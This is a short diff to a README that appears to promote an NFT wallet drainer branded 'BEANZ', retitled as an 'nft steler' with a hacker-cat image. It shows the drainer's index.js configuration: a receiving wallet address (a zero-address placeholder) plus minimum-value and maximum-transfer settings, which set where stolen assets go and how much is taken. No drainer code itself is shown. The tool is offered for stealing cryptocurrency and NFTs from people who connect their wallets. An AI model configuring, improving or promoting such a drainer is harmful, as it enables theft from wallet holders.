@@ -1,15 +1,15 @@
 <div align="center">
 
-![Dark Hacker](https://media1.tenor.com/m/PLIr_VkF6ywAAAAd/ghostedvpn-hacker-cat.gif)
+<img src="https://media1.tenor.com/m/PLIr_VkF6ywAAAAd/ghostedvpn-hacker-cat.gif" width="250" height="250" alt="Dark Hacker" />
 
 <h1 align="center"><code>🕶️ BΞΛИZ</code></h1>
-<h3 align="center"><code>𝖓𝖋𝖙 𝖌𝖍𝖔𝖘𝖙‑𝖘𝖍𝖎𝖋𝖙 • 𝖋𝖗𝖊𝖒𝖎𝖘𝖍 𝖉𝖗𝖆𝖎𝖓</code></h3>
+<h3 align="center"><code>𝖇𝖊𝖆𝖓𝖟 – 𝖓𝖋𝖙 𝖘𝖙𝖊𝖑𝖊𝖗</code></h3>
 
 </div>
 
-### ⚙️ Config
+### ⚙️ Config <code>index.js</code>
 
-```index.js
+```
 const receiveAddress = "0x0000000000000000000000000000000000000000";
 minValue: 0.1;
 maxTransfer: 4;
